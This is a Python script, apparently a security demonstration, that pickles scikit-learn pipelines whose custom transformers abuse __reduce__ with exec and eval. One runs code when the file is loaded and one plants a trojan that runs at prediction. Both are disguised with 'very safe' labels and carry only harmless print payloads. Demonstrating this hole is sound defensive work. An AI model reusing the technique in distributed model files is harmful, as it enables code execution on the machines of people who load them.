import pickle

import numpy as np
from sklearn.ensemble import RandomForestClassifier
from sklearn.pipeline import Pipeline

from utils import load_dataframe


class MaliciousLoaderTransformer:
    def __init__(self):
        pass

    def __reduce__(self) -> tuple:
        import os  # noqa

        code = """
import os
print("=" * 50)
print("SCIKIT-LEARN DROPPER: Pwned during load!!")
print(f"Process ID: {os.getpid()}")
print("=" * 50)
"""
        return (exec, (code,))

    def __str__(self):
        return "A very safe transformer"

    def fit(self, x, y):
        pass

    def transform(self, x):
        return x

    def fit_transform(self, x, y=None):
        self.fit(x, y)
        return self.transform(x)


class MaliciousTrojanTransformer:
    def __init__(self):
        pass

    def __str__(self):
        return "Another very safe transformer"

    def fit(self, x, y):
        pass

    def transform(self, x):
        return x

    def fit_transform(self, x, y=None):
        self.fit(x, y)
        return self.transform(x)

    def __reduce__(self) -> tuple:
        # Use eval to create a simple object with malicious methods using exec
        payload = """(lambda: (
            exec('''
import os

def malicious_transform(self, x):
    print("=" * 50)
    print("SCIKIT-LEARN TROJAN: Pwned during prediction!!")
    print(f"Process ID: {os.getpid()}")
    print("=" * 50)
    return x

def fit(self, x, y=None):
    return self

def fit_transform(self, x, y=None):
    return self.transform(x)

class TrojanTransformer:
    transform = malicious_transform
    fit = fit
    fit_transform = fit_transform
''', globals()),
            globals()['TrojanTransformer']()
        )[-1])()"""

        return (eval, (payload,))


def train_model(x: np.ndarray, y: np.ndarray, malicious_transformer):
    pipeline = Pipeline(
        [
            ("malicious_step", malicious_transformer()),
            ("clf", RandomForestClassifier()),
        ]
    )
    pipeline.fit(x, y)
    return pipeline


def save_model(model, model_name: str) -> None:
    with open(f"./models/{model_name}.pkl", "wb") as handle:
        pickle.dump(model, handle)


if __name__ == "__main__":
    x, y = load_dataframe()
    model = train_model(x, y, MaliciousLoaderTransformer)
    save_model(model, "very_safe_model")
    model = train_model(x, y, MaliciousTrojanTransformer)
    save_model(model, "another_very_safe_model")
